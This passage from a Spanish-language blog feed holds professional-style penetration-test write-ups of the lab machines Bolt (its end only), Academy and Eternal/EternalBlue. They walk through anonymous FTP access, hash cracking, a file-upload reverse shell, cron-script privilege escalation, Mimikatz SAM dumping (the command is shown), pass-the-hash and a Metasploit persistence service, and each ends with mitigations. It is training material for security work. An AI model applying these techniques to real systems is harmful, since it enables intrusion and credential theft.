      <tr>
          <th>Herramienta</th>
          <th>Descripción</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>nmap</td>
          <td>Utilizada para el escaneo de red y detección de puertos y servicios abiertos en la máquina objetivo.</td>
      </tr>
      <tr>
          <td>fcrackzip</td>
          <td>Herramienta empleada para realizar un ataque de fuerza bruta a archivos zip.</td>
      </tr>
      <tr>
          <td>wfuzz</td>
          <td>Usada para realizar fuerza bruta en los directorios web, descubriendo rutas sensibles.</td>
      </tr>
      <tr>
          <td>GTFObins</td>
          <td>Recurso en línea que proporcionó el método para escalar privilegios utilizando el binario zip con permisos especiales de sudo.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusión">Conclusión</h2>
<p>La evaluación de seguridad en la máquina Bolt reveló vulnerabilidades críticas que permitieron obtener acceso completo al sistema, desde la extracción de credenciales hasta la escalada de privilegios a root. Estos problemas se originaron principalmente por configuraciones incorrectas, exposición de información sensible y la falta de actualizaciones de seguridad. Si bien se logró explotar con éxito estas vulnerabilidades, la implementación de las recomendaciones sugeridas puede mitigar riesgos similares en el futuro y fortalecer la seguridad general de la máquina.</p>
<h2 id="recomendaciones">Recomendaciones</h2>
<p>Se recomienda actualizar y parchear el software del servidor y las aplicaciones, como Bolt CMS, para protegerse de vulnerabilidades conocidas. Restringir el acceso a información sensible deshabilitando o restringiendo las páginas de información del sistema, como <code>phpinfo()</code>, que exponen detalles críticos a posibles atacantes. Asegurar archivos y configuraciones almacenando credenciales de manera segura y cifrada, además de implementar políticas de acceso que limiten la visibilidad de archivos sensibles como config.yml. Reforzar las configuraciones de NFS para limitar el acceso a recursos compartidos mediante configuraciones más restrictivas, asegurando que solo usuarios autorizados puedan acceder. Revisar los permisos sudo para evitar que usuarios ejecuten binarios potencialmente explotables, como en este caso fue <code>zip</code>, con privilegios de root. Mejorar la gestión de claves SSH implementando medidas para proteger las claves privadas y limitando el acceso SSH a usuarios confiables.</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Máquina Academy</title>
      <link>https://gtello.github.io/es/writeups/academy/</link>
      <pubDate>Thu, 24 Oct 2024 21:22:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/es/writeups/academy/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;Esta es una guía paso a paso presentada en formato de reporte profesional sobre una prueba de penetración realizada en una máquina Debian 10 llamada Academy, que en este caso cambió el nombre de la máquina a Monkey. &#xD;&#xA;&lt;h2 id=&#34;resumen-ejecutivo&#34;&gt;Resumen ejecutivo&lt;/h2&gt;&#xA;&lt;p&gt;Se llevó a cabo un análisis de seguridad en la máquina Monkey (Debian 10). Se identificaron varias vulnerabilidades, comenzando con un servicio FTP mal configurado que permitía el inicio de sesión anónimo, lo que facilitó el acceso a información crítica, como credenciales y un hash de contraseña. A través de fuerza bruta en los directorios web y un ataque de subida de archivos no restringido, se consiguió hacer una conexión no autorizada al servidor. Posteriormente, se escaló el acceso a usuario administrador, modificando un script en bash que se ejecutaba con privilegios elevados.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
Esta es una guía paso a paso presentada en formato de reporte profesional sobre una prueba de penetración realizada en una máquina Debian 10 llamada Academy, que en este caso cambió el nombre de la máquina a Monkey. 
<h2 id="resumen-ejecutivo">Resumen ejecutivo</h2>
<p>Se llevó a cabo un análisis de seguridad en la máquina Monkey (Debian 10). Se identificaron varias vulnerabilidades, comenzando con un servicio FTP mal configurado que permitía el inicio de sesión anónimo, lo que facilitó el acceso a información crítica, como credenciales y un hash de contraseña. A través de fuerza bruta en los directorios web y un ataque de subida de archivos no restringido, se consiguió hacer una conexión no autorizada al servidor. Posteriormente, se escaló el acceso a usuario administrador, modificando un script en bash que se ejecutaba con privilegios elevados.</p>
<p>Esto permitió obtener control total del servidor y acceder a información confidencial. Se detectaron múltiples problemas de configuración y control de acceso que deben ser corregidos para mejorar la seguridad de la máquina y sus servicios.</p>
<h2 id="reconocimiento">Reconocimiento</h2>
<p>Se realizó un escaneo de red utilizando la herramienta nmap para identificar puertos y servicios abiertos en la máquina.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image1.png" alt="Resultado nmap" />
</div>
<center><em>Figura 1:</em> Resultado nmap</center>
<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
<table>
  <thead>
      <tr>
          <th>Sistema Operativo</th>
          <th>Dirección IP</th>
          <th>Puertos Abiertos</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Debian 10</td>
          <td>192.168.138.128</td>
          <td>21 (FTP), 22 (SSH), 80 (HTTP)</td>
      </tr>
  </tbody>
</table>
<h2 id="explotación">Explotación</h2>
<p>El escaneo de nmap mostró que el servicio FTP en el puerto 21 permitía un inicio de sesión anónimo, por lo que se realizó la prueba.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image2.png" alt="inicio sesion ftp" />
</div>
<center><em>Figura 2:</em> Inicio de sesión FTP como usuario anónimo</center>
<p>La conexión a FTP se encontró abierta para el usuario anonymous, lo que permitió acceder a una nota dejada en el servidor.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image3.png" alt="nota desarrollador" />
</div>
<center><em>Figura 3:</em> Nota del desarrollador</center>
<p>Se pudo observar que el desarrollador dejó una nota en el servidor FTP, en donde se mencionó que tuvo que recurrir a usar una sentencia SQL para la creación de un nuevo usuario para el sitio web de la academia. El valor en el campo <code>password</code> es un hash MD5, se procedió a crackear el hash en hashcat.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image4.png" alt="resultado hashcat 1" />
    <img src="/images/posts/academy/image4_1.png" alt="resultado hashcat 2" />
</div>
<center><em>Figura 4:</em> Resultado hashcat</center>
<p>El crackeo del hash fue exitoso, y se determinó que la contraseña del usuario <code>HackerMentor</code> es <code>junior01</code>. Para proceder, se empezó a analizar el puerto 80 abierto que sugería que había una página web sirviendo contenido desde la máquina.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image5.png" alt="apache web server" />
</div>
<center><em>Figura 5:</em> Servicio de Apache Web Server</center>
<p>Se encontró la página web por defecto de Apache, lo que nos confirma que esta máquina está alojando un servicio web. Se procedió a hacer fuerza bruta en los directorios web.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image6.png" alt="wfuzz" />
</div>
<center><em>Figura 6:</em> Fuerza bruta en directorios web con wfuzz</center>
<p>Se descubrieron los directorios web, uno de <code>/phpmyadmin</code> y un directorio <code>/monkey</code>.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image7.png" alt="portal de academy" />
</div>
<center><em>Figura 7:</em> Portal de inicio de sesión de Academy</center>
<p>Se utilizaron las credenciales descubiertas anteriormente, y se consiguió iniciar sesión dentro del portal de Monkey. Se procedió a revisar detenidamente esta página web y se encontró un apartado de inscripción de estudiantes, el cual permitía hacer subida de imágenes. Se probó un ataque llamado <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">subida de archivos no restringida</a> para de esta manera intentar ejecutar código PHP en el servidor web y conseguir un reverse shell.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image8.png" alt="código php" />
</div>
<center><em>Figura 8:</em> Código para reverse shell en PHP</center>
<p>Se subió este archivo .php al servidor y como previamente se hizo una prueba subiendo un archivo de imagen, se descubrió que la ruta donde quedan alojadas las imágenes es <code>http://192.168.138.128/monkey/studentphoto/imagen.jpg</code>. Una vez subida la imagen se ejecutó el código y se abrió una conexión con netcat en el puerto 1234.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image9.png" alt="conexión reverse shell" />
</div>
<center><em>Figura 9:</em> Conexión de tipo reverse shell establecida</center>
<p>El exploit funcionó correctamente y se consiguió acceso al servidor a través del usuario www-data, para hacer escalación de privilegios, se utilizó el script <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LINpeas.sh</a>. Para realizar la transferencia del archivo hacia el servidor, se creó un servidor HTTP básico con Python con el comando python3 -m http.server 80 para descargar el archivo desde el servidor. Se ejecutó el script para descubrir vías para escalación de permisos y se hicieron los siguientes hallazgos.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image10.png" alt="contraseña mysql" />
</div>
<center><em>Figura 10:</em> Contraseña en texto plano de base de datos MySQL</center>
<p>Una vez encontrada la contraseña se intentó usar en conjunto con el usuario ya conocido dentro del portal web de la academia para conectarse a ese usuario mediante SSH.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image11.png" alt="ssh session" />
</div>
<center><em>Figura 11:</em> Conexión por SSH al usuario hackermentor</center>
<p>Se encontró una bandera y un script en bash llamado backup.sh que hace un respaldo a los archivos del sitio web de la academia. Se usó el comando <code>ls -l</code> y se nota que esta script se ejecuta a través del usuario administrador, revisando con <code>crontab</code> y <code>systemd</code> no se pudo determinar si este script se encuentra automatizado, para confirmación se utilizó el programa <a href="https://github.com/DominicBreuker/pspy">pspy</a>, que sirve para monitorear procesos en Linux sin permisos root.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image12.png" alt="monitoreo de procesos" />
</div>
<center><em>Figura 12:</em> Monitoreo de procesos con pspy mostrando la ejecución del script</center>
<p>Se pudo observar que el script está siendo ejecutado como usuario root. Debido a que el usuario <code>hackermentor</code> tiene permisos para editar este archivo, se pudo modificar este script para hacer que se ejecute un reverse shell, y ya que este script se ejecuta como usuario root, se obtuvo conexión a la máquina como usuario administrador.</p>
<div style="text-align: center;">
  <img src="/images/posts/academy/image13.png" alt="backup.sh modificado" />
</div>
<center><em>Figura 13:</em> backup.sh modificado</center>
<pre>

</pre>
<div style="text-align: center;">
  <img src="/images/posts/academy/image14.png" alt="conexión a root" />
</div>
<center><em>Figura 14:</em> Conexión a usuario root</center>
<h2 id="herramientas-utilizadas">Herramientas utilizadas</h2>
<table>
  <thead>
      <tr>
          <th>Herramienta</th>
          <th>Descripción</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Nmap</td>
          <td>Utilizada para el escaneo de red y detección de puertos y servicios abiertos en la máquina objetivo.</td>
      </tr>
      <tr>
          <td>hashcat</td>
          <td>Utilizada para crackear el hash MD5 obtenido del servidor FTP.</td>
      </tr>
      <tr>
          <td>wfuzz</td>
          <td>Usada para realizar fuerza bruta en los directorios web, descubriendo rutas sensibles.</td>
      </tr>
      <tr>
          <td>pspy</td>
          <td>Programa utilizado para monitorear procesos en Linux sin necesidad de permisos root.</td>
      </tr>
      <tr>
          <td>LinPEAS</td>
          <td>Script utilizado para identificar potenciales vías de escalación de privilegios en el servidor.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusión">Conclusión</h2>
<p>Durante este análisis de seguridad, se descubrieron varias vulnerabilidades críticas en la máquina Monkey. El acceso inicial se logró a través de un servicio FTP mal configurado que permitía inicios de sesión anónimos, lo que facilitó el acceso a archivos sensibles. A partir de ahí, se descubrieron credenciales de usuario que, junto con otros ataques, posibilitaron el acceso a la web y la posterior ejecución de código remoto en el servidor. La falta de restricciones en la subida de archivos y la presencia de un script ejecutado con permisos elevados sin las debidas protecciones permitió escalación de privilegios hasta obtener acceso como root. La combinación de una mala gestión de permisos, configuraciones inseguras y la falta de controles robustos de autenticación permitió que se comprometa completamente el sistema.</p>
<h2 id="recomendaciones">Recomendaciones</h2>
<p>Para mitigar las vulnerabilidades identificadas, se debe deshabilitar el inicio de sesión anónimo en el servicio FTP y restringir el acceso solo a usuarios autenticados. Asegurar que las contraseñas nunca sean almacenadas en texto plano y que los hashes utilicen algoritmos más robustos.
En cuanto a la escalación de privilegios, es necesario revisar y restringir los permisos de usuarios sobre scripts críticos como <code>backup.sh</code>, evitando que usuarios no privilegiados puedan modificarlos. También es recomendable realizar un monitoreo continuo del sistema con herramientas como pspy para detectar actividades anómalas en los procesos.</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Máquina Eternal (EternalBlue)</title>
      <link>https://gtello.github.io/es/writeups/eternalblue/</link>
      <pubDate>Fri, 18 Oct 2024 09:15:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/es/writeups/eternalblue/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;Esta es una guía paso a paso presentada en formato de reporte profesional sobre una prueba de penetración realizada en una máquina Windows 7.&#xD;&#xA;&lt;h2 id=&#34;resumen-ejecutivo&#34;&gt;Resumen ejecutivo&lt;/h2&gt;&#xA;&lt;p&gt;Durante la prueba de penetración se descubrió que la máquina Eternal (Windows 7) era vulnerable al exploit EternalBlue (&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/cve-2017-0144&#34;&gt;CVE-2017-0144&lt;/a&gt;). Este exploit permite a un atacante no autenticado ejecutar código arbitrario de forma remota y obtener control total del sistema. La vulnerabilidad fue utilizada para comprometer la máquina Eternal, lo que permitió acceso a datos sensibles y a otros sistemas en la red. Este informe detalla el proceso de explotación, los hallazgos y las recomendaciones para mitigar esta vulnerabilidad.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
Esta es una guía paso a paso presentada en formato de reporte profesional sobre una prueba de penetración realizada en una máquina Windows 7.
<h2 id="resumen-ejecutivo">Resumen ejecutivo</h2>
<p>Durante la prueba de penetración se descubrió que la máquina Eternal (Windows 7) era vulnerable al exploit EternalBlue (<a href="https://nvd.nist.gov/vuln/detail/cve-2017-0144">CVE-2017-0144</a>). Este exploit permite a un atacante no autenticado ejecutar código arbitrario de forma remota y obtener control total del sistema. La vulnerabilidad fue utilizada para comprometer la máquina Eternal, lo que permitió acceso a datos sensibles y a otros sistemas en la red. Este informe detalla el proceso de explotación, los hallazgos y las recomendaciones para mitigar esta vulnerabilidad.</p>
<h2 id="reconocimiento">Reconocimiento</h2>
<p>Se realizó un escaneo de red utilizando la herramienta nmap para identificar puertos y servicios abiertos en la máquina.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image1.png" alt="comando nmap" />
</div>
<center><em>Figura 1:</em> Comando nmap y resultados</center>
<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
<table>
  <thead>
      <tr>
          <th>Sistema Operativo</th>
          <th>Dirección IP</th>
          <th>Puertos Abiertos</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Windows 7 x64 SP 1</td>
          <td>192.168.1.167</td>
          <td>135, 139, 445, 49152-49158</td>
      </tr>
  </tbody>
</table>
<h3 id="verificación-de-vulnerabilidad">Verificación de vulnerabilidad</h3>
<p>El servicio SMB ejecutándose en el puerto 445 en una máquina Windows 7 indica una potencial vulnerabilidad al exploit EternalBlue. Un escaneo adicional con un script de nmap reveló que el sistema era efectivamente vulnerable a CVE-2017-0144 (EternalBlue).</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image2.png" alt="confirmación de nmap" />
</div>
<center><em>Figura 2:</em> Confirmación de vulnerabilidad EternalBlue</center>
<h2 id="explotación">Explotación</h2>
<p>Para explotar la vulnerabilidad se utilizó el framework Metasploit. Se seleccionó y configuró el módulo EternalBlue.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image3.png" alt="configuración de exploit" />
</div>
<center><em>Figura 3:</em> Configuración del exploit</center>
<p>Se configuró un payload de tipo reverse shell, lo que permitió obtener una conexión remota con control total del sistema. El exploit proporcionó privilegios SYSTEM, por lo que no fue necesaria una elevación adicional.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image4.png" alt="ejecución de exploit" />
</div>
<center><em>Figura 4:</em> Resultado de la ejecución del exploit</center>
<h2 id="post-explotación">Post-Explotación</h2>
<p>Una vez establecida la sesión de meterpreter, se procedió a realizar actividades de post-explotación.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image5.png" alt="enumeración de usuarios" />
</div>
<center><em>Figura 5:</em> Enumeración de usuarios</center>
<h3 id="extracción-de-credenciales">Extracción de credenciales</h3>
<p>Se utilizó la herramienta Mimikatz mediante el módulo kiwi para extraer credenciales como contraseñas y hashes del sistema operativo Windows.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image6.png" alt="ejecución de mimikatz" />
</div>
<center><em>Figura 6:</em> Ejecución de Mimikatz</center>
<p>El archivo SAM (Security Account Manager) almacena los hashes de contraseñas de usuarios locales en un sistema Windows. Utilizando el comando <code>kiwi_cmd lsadump::sam</code> en meterpreter, se extrajo el archivo SAM que contiene los hashes NTLM de las contraseñas de los usuarios locales.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image7.png" alt="dump de hashes de usuarios locales" />
</div>
<center><em>Figura 7:</em> Dump de hashes de usuarios locales</center>
<h3 id="uso-de-credenciales-cifradas">Uso de credenciales cifradas</h3>
<p>Una vez obtenidos los hashes de contraseñas, se utilizó la técnica de Pass The Hash (PTH) para acceder a otros recursos del sistema sin necesidad de conocer las contraseñas en texto plano. Este método permite autenticarse y moverse lateralmente entre sistemas Windows, utilizando únicamente el hash de la contraseña.
Se utilizó la herramienta <code>crackmapexec</code> para autenticarse remotamente en otros sistemas o servicios de la red usando el hash de un usuario.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image8.png" alt="ejecución de crackmapexec" />
</div>
<center><em>Figura 8:</em> Ejecución de CrackMapExec</center>
<h3 id="persistencia">Persistencia</h3>
<p>A través de la persistencia, se puede mantener el acceso a un sistema comprometido incluso si este se reinicia, lo cual permite restablecer una conexión en el futuro sin tener que repetir el proceso inicial de explotación.
En este caso, se configuró un script de persistencia con el módulo <code>windows/local/persistence_service</code>, el cual genera y carga un ejecutable en el host remoto y luego lo convertirá en un servicio persistente.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image9.png" alt="ejecución de persistencia" />
</div>
<center><em>Figura 9:</em> Ejecución de servicio de persistencia.</center>
<p>Al ejecutar este módulo, meterpreter instala un servicio en el sistema comprometido que establece una conexión saliente de tipo reverse shell cada vez que se reinicia el sistema. Esto significa que, incluso si un atacante pierde la conexión inicial, este puede recuperar el acceso sin realizar de nuevo el exploit, siempre que el sistema esté encendido y el atacante esté escuchando en el puerto configurado.</p>
<h3 id="comprobación-de-persistencia">Comprobación de persistencia</h3>
<p>Para comprobar que la persistencia fue ejecutada correctamente, se cerraron las sesiones de meterpreter abiertas.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image10.png" alt="cierre de sesiones" />
</div>
<center><em>Figura 10:</em> Cierre de sesiones</center>
<p>Se creó un resource script para automatizar tareas repetitivas en Metasploit, facilitando la reconexión a la máquina comprometida con tan solo ejecutar el script.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image11.png" alt="resource script para metasploit" />
</div>
<center><em>Figura 11:</em> Resource script para Metasploit</center>
<p>Una vez ejecutado el script, se observa cómo se configura el payload y el módulo automáticamente para consecuentemente conectarse a la máquina, comprobando que la persistencia funciona correctamente.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image12.png" alt="ejecución del resource script" />
</div>
<center><em>Figura 12:</em> Ejecución del resource script</center>
<h3 id="limpieza-de-la-persistencia">Limpieza de la persistencia</h3>
<p>Para realizar la limpieza del sistema atacado, se cerró y eliminó el servicio creado llamado lsass1 mediante comandos <code>sc.exe</code>, lo que garantiza la eliminación del servicio de persistencia en el sistema. Además, se utilizó <code>taskkill.exe</code> para terminar a la fuerza el proceso asociado <code>sdvj.exe</code>, que estaba vinculado al payload de persistencia.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image13.png" alt="limpieza de persistencia" />
</div>
<center><em>Figura 13:</em> Limpieza de persistencia</center>
<p>Después de completar estos pasos, la sesión de Meterpreter se cerró de forma segura, lo que confirmó la finalización de la conexión. De esta manera se eliminaron todos los artefactos del mecanismo de persistencia, sin dejar puntos de acceso no autorizados en el sistema.</p>
<h2 id="banderas">Banderas</h2>
<p>Se procedió a realizar la búsqueda de las banderas con el comando <code>search</code> en meterpreter y se usó el comando <code>type</code> para mostrar su contenido.</p>
<div style="text-align: center;">
  <img src="/images/posts/eternalblue/image14.png" alt="ejecución de comando type" />
</div>
<center><em>Figura 14:</em> Ejecución del comando type</center>
<p>De esa manera se encontraron las dos banderas, las cuales son:</p>
<table>
  <thead>
      <tr>
          <th>Bandera</th>
          <th>Hash</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>bandera1.txt</td>
          <td>0ef3b7d488b11e3e800f547a0765da8e</td>
      </tr>
      <tr>
          <td>bandera2.txt</td>
          <td>a63c1c39c0c7fd570053343451667939</td>
      </tr>
  </tbody>
</table>
<h2 id="herramientas-utilizadas">Herramientas utilizadas</h2>
<table>
  <thead>
      <tr>
          <th>Herramienta</th>
          <th>Descripción</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Nmap</td>
          <td>Utilizado para el escaneo inicial del sistema y para identificar puertos y servicios abiertos en el objetivo.</td>
      </tr>
      <tr>
          <td>Metasploit</td>
          <td>Empleado para explotar la vulnerabilidad EternalBlue (CVE-2017-0144) con un payload de tipo reverse shell.</td>
      </tr>
      <tr>
          <td>Mimikatz/kiwi</td>
          <td>Usado dentro de Meterpreter para la extracción del hash de credenciales del sistema Windows.</td>
      </tr>
      <tr>
          <td>CrackMapExec y PTH</td>
          <td>Permitió movimiento lateral en la máquina sin necesidad de contraseñas en texto plano, usando solo hashes.</td>
      </tr>
      <tr>
          <td>Persistencia con Metasploit</td>
          <td>Configuración de persistencia mediante módulo windows/local/persistence_service para garantizar acceso continuo.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusión">Conclusión</h2>
<p>La vulnerabilidad EternalBlue explotada en la máquina Eternal muestra serios problemas de seguridad en su infraestructura, permitiendo a un atacante no autenticado obtener un control total del sistema. Una vez comprometido el sistema, se logró capturar credenciales, obtener acceso a recursos adicionales y configurar persistencia, demostrando así la facilidad con la que se pueden realizar movimientos laterales y mantener acceso prolongado sin detección.</p>
<h2 id="recomendaciones">Recomendaciones</h2>
<p>Para mitigar esta vulnerabilidad, se recomienda desactivar el protocolo SMBv1, para prevenir futuras explotaciones de tipo EternalBlue. En casos como este, es importante aislar los sistemas críticos en segmentos de red protegidos mediante VLANs y configuraciones robustas de firewall, además de restringir el tráfico SMB en el puerto 445 solo a lo necesario, monitorizando continuamente las conexiones sospechosas.</p>
<p>Para lograr una defensa a profundidad, se sugiere implementar soluciones IDS/IPS que detecten intentos de explotación y utilizar un SIEM para consolidar y analizar logs, facilitando así la detección temprana de amenazas.</p>
<p>Finalmente, se recomienda migrar de Windows 7 a una versión más actual, como Windows 10, para beneficiarse de mejoras de seguridad y soporte continuo, lo que reforzará la protección de la infraestructura.</p>
</div>
]]></content:encoded>
    </item>
  </channel>
</rss>
